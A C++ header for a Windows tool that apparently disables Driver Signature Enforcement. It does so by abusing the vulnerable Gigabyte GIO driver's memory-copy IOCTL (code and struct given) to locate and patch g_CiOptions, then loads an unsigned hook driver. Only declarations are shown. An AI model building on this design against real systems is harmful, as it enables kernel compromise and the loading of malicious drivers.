#pragma once
#include "Windows.h"
#include "ntstatus.h"
#include <cstdio>
#include <iostream>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Advapi32.lib")

#include "..\classes\ntdll.h"

#define IOCTL_GIO_MEMCPY 0xC3502808

typedef struct _GIO_MemCpyStruct 
{
	ULONG64 dest;
	ULONG64* src;
	DWORD size;
} GIO_MemCpyStruct;

class DSE
{
public:
	DWORD buildNumber;

	bool LoadGigDriver();
	RTL_OSVERSIONINFOW GetRealOSVersion();
	NTSTATUS GetCiMap(PVOID* imageBase);
	NTSTATUS GetCiBase(PULONG_PTR imageBase);
	bool CompareByte(const PUCHAR data, const PUCHAR pattern, UINT32 len);
	NTSTATUS GetCiPOffset(PBYTE CiIntitalize, PULONG_PTR CipInitialize);
	NTSTATUS GetGCiOffset(ULONG_PTR CipIntitalize, ULONG_PTR CiDllBase, PVOID CiMap, PULONG_PTR g_CiOptionsAddress);
	NTSTATUS FinalCalculation(PVOID* g_CiOptionsAddress);
	NTSTATUS DisableDSE(PVOID g_CiOptionsAddress, HANDLE driverHandle);
	bool LoadHookDriver();
	NTSTATUS EnableDSE(PVOID g_CiOptionsAddress,HANDLE driverHandle);
	bool UnLoadGigDriver();
	bool UnLoadHookDriver();
};
inline DSE dse;